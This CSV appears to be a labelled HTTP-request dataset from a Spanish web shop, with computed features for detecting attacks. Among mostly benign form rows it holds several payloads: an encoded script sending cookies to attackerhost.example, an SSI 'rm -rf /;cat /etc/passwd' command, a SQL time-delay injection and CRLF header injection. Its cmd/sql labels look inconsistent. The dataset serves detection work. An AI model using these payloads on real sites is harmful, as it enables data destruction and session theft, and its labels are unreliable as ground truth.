row_id,payload,category,needs_review,length,has_quotes,has_angle_brackets,has_path,has_cmd,priority,kb_family,char_len_computed,length_matches_computed,line_break_count,pipe_field_count_approx,space_ratio,digit_ratio,unique_char_ratio,shannon_entropy_bits,has_http_version_tail,contains_http_version_token,field_delimiter_style,quoted_csv_like_wrapping,application_injection_context,application_context_unknown_reason,percent_escape_count,percent_encoding_density,encoding_surface_class,has_double_percent_encoding,has_null_percent,has_crlf_encoded_or_literal,heuristic_pattern_band,label_consistency_flag
3415,registro | hyong-ju9 | CuidadorA | Vladimir | Yaben Billini | kempf@gemas.org.mr | 71246547E%20 | San Francisco De Paula 67 11-C | Trasobares | 23746 | Teruel | 0763433246447327 | Registrar HTTP/1.1,cmd,no,198,0,0,0,1,low,cmd,198,yes,0,13,0.15656565656565657,0.1919191919191919,0.25252525252525254,4.933238636680025,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",1,0.005050505050505051,ascii_with_percent_encoding,False,False,False,unknown,no_keyword_pattern_matched
3416,registro | hyong-ju9 | CuidadorA | Vladimir | Yaben Billini | kempf@gemas.org.mr | 4B1490061Q | San Francisco De Paula 67 11-C | Trasobares | 23746 | Teruel | 0763433246447327 | Registrar HTTP/1.1,cmd,no,196,0,0,0,1,low,cmd,196,yes,0,13,0.15816326530612246,0.1836734693877551,0.24489795918367346,4.9127211410900475,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3417,registro | hyong-ju9 | CuidadorA | Vladimir | Yaben Billini | kempf@gemas.org.mr | 71246547E | San Francisco De Paula 67 11-C | Trasobares | 23746 | Teruel | 0763433246447327 | Registrar HTTP/1.1,cmd,no,195,0,0,0,1,low,cmd,195,yes,0,13,0.15897435897435896,0.18461538461538463,0.2512820512820513,4.8985009791922725,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3418,entrar | antonin | 0a18V2r2Ceo | on | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium,cmd,53,yes,0,5,0.16981132075471697,0.1320754716981132,0.39622641509433965,3.9937053036531056,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3419,insertarsessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | 9350 | Confirmar HTTP/1.1,cmd,no,382,0,0,0,1,low,cmd,382,yes,0,3,0.01832460732984293,0.4816753926701571,0.10209424083769633,3.9449454976385936,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",105,0.27486910994764396,ascii_with_percent_encoding,False,False,False,unknown,no_keyword_pattern_matched
3420,insertar | 9350 | | HTTP/1.1,cmd,no,28,0,0,0,1,high,cmd,28,yes,0,4,0.17857142857142858,0.21428571428571427,0.6785714285714286,4.008621780036166,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3421,insertar | 9350 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium,cmd,42,yes,0,3,0.16666666666666666,0.14285714285714285,0.5476190476190477,4.171814448282569,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3422,insertar | 9350 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium,cmd,36,yes,0,3,0.1388888888888889,0.16666666666666666,0.6388888888888888,4.291879432707956,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3423,"any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | maudie | cegaTo?so | Yured | Modrego Aylagas | natzler.machiavelli@francislucille.cy | 68096192T | C/ Carlos De La Rica, 8 11?A | Puigverd d'Agramunt | 08672 | Palencia | 6396253761051262 | Registrar HTTP/1.1",cmd,no,265,1,0,0,1,low,cmd,265,yes,0,13,0.12452830188679245,0.2188679245283019,0.2037735849056604,5.148402186623608,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",5,0.018867924528301886,ascii_with_percent_encoding,False,False,False,header_injection_token_evidence,pattern_supports_family
3424,"registro | maudie | cegaTo?so | Yured | Modrego Aylagas | natzler.machiavelli@francislucille.cy | 68096192T | C/ Carlos De La Rica, 8 11?A | Puigverd d'Agramunt | 08672 | Palencia | 276695642551071A | Registrar HTTP/1.1",cmd,no,219,1,0,0,1,low,cmd,219,yes,0,13,0.1506849315068493,0.1506849315068493,0.2100456621004566,4.89966387238884,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3425,"registro | jocelyn | v821ri8 | Raven | Rambla Jalencas<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | bourdette@sexl.ro | 66518253E | C/ Fuerte Isabel Ii, 78 3?C | Sando | 50088 | Girona | 0028019013829640 | Registrar HTTP/1.1",sql,no,225,1,1,0,1,low,sql,225,yes,0,13,0.16,0.1688888888888889,0.2577777777777778,5.0999651008136615,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3426,"registro | jocelyn | v821ri8 | Raven | Rambla Jalencas | bourdette@sexl.ro | 66518253E | C/ Fuerte Isabel Ii, 78 3?C | Sando | 50088 | Girona | 470757643624576 | Registrar HTTP/1.1",cmd,no,180,0,0,0,1,low,cmd,180,yes,0,13,0.17222222222222222,0.20555555555555555,0.25555555555555554,4.868864028114408,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3427,"registro | jocelyn | v821ri8 | Raven | Rambla Jalencas | bourdette@sexl.ro | 66518253E | C/ Fuerte Isabel Ii, 78 3?C | Sando | 50088 | Girona | 0028019013829640 | Registrar HTTP/1.1",cmd,no,181,0,0,0,1,low,cmd,181,yes,0,13,0.1712707182320442,0.20994475138121546,0.2596685082872928,4.857825401957916,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3428,"2 | Vino Rioja | 85 | 83 | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1",sql,no,80,1,1,0,1,low,sql,80,yes,0,5,0.1875,0.0875,0.475,4.750393414726219,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3429,entrar | takagi71 | b6e | ');waitfor delay '0:0:15';-- | Entrar HTTP/1.1,sql,no,72,1,0,0,1,medium,sql,72,yes,0,5,0.1527777777777778,0.125,0.4583333333333333,4.604884191885354,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,time_based_or_delay_primitive,pattern_supports_family
3430,entrar | takagi71 | b6e | off | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium,cmd,47,yes,0,5,0.19148936170212766,0.10638297872340426,0.46808510638297873,4.064395234288111,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3431,insertar | 7646sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | Confirmar HTTP/1.1,cmd,no,382,0,0,0,1,low,cmd,382,yes,0,3,0.01832460732984293,0.4816753926701571,0.10209424083769633,3.925839084763063,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",105,0.27486910994764396,ascii_with_percent_encoding,False,False,False,unknown,no_keyword_pattern_matched
3432,insertar | 7646 | @40 HTTP/1.1,cmd,no,30,0,0,0,1,medium,cmd,30,yes,0,3,0.16666666666666666,0.26666666666666666,0.6666666666666666,4.119902579793958,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3433,insertar | 7646 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium,cmd,42,yes,0,3,0.16666666666666666,0.14285714285714285,0.5238095238095238,4.124195400663521,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3434,insertar | 7646 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium,cmd,36,yes,0,3,0.1388888888888889,0.16666666666666666,0.6111111111111112,4.236323877152401,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3435,"entrar | ""><!--#EXEC cmd=""dir ""-->< | 1Ece57aL | off | Entrar HTTP/1.1",sql,no,70,1,1,0,1,medium,sql,70,yes,0,5,0.15714285714285714,0.07142857142857142,0.45714285714285713,4.616025148574431,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3436,entrar | calmenso | 1Ece57aL | off/ | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium,cmd,53,yes,0,5,0.16981132075471697,0.09433962264150944,0.4339622641509434,4.203505595705252,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3437,entrar | calmenso | 1Ece57aL | off | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium,cmd,52,yes,0,5,0.17307692307692307,0.09615384615384616,0.4423076923076923,4.18517072738203,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3438,insertar | 8537 | %3F HTTP/1.1,cmd,no,30,0,0,0,1,medium,cmd,30,yes,0,3,0.16666666666666666,0.23333333333333334,0.7,4.186569246460625,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",1,0.03333333333333333,ascii_with_percent_encoding,False,False,False,unknown,no_keyword_pattern_matched
3439,insertar | 8537 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium,cmd,36,yes,0,3,0.1388888888888889,0.16666666666666666,0.6388888888888888,4.291879432707956,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3440,entrar | rajchwal | SUpLeToRio | off/ | Entrar HTTP/1.1,cmd,no,55,0,0,0,1,medium,cmd,55,yes,0,5,0.16363636363636364,0.03636363636363636,0.4909090909090909,4.369564431856577,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3441,entrar | rajchwal | SUpLeToRio | off | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium,cmd,54,yes,0,5,0.16666666666666666,0.037037037037037035,0.5,4.353984900464495,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3442,insertar | 2511 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium,cmd,42,yes,0,3,0.16666666666666666,0.14285714285714285,0.5,4.0289573054254255,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3443,insertar | 2511 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium,cmd,41,yes,0,3,0.17073170731707318,0.14634146341463414,0.5121951219512195,4.009719689280522,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3444,entrar | tahani97any%0ASet-cookie%3A+Tamper%3D1041264011025374727 | tije972e9 | off | Entrar HTTP/1.1,cmd,no,101,0,0,0,1,low,cmd,101,yes,0,5,0.0891089108910891,0.297029702970297,0.37623762376237624,4.884233423698167,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",3,0.0297029702970297,ascii_with_percent_encoding,False,False,False,header_injection_token_evidence,pattern_supports_family
3445,entrar | tahani97 | tije972e9 | off | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium,cmd,53,yes,0,5,0.16981132075471697,0.1509433962264151,0.41509433962264153,4.1280338975920445,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
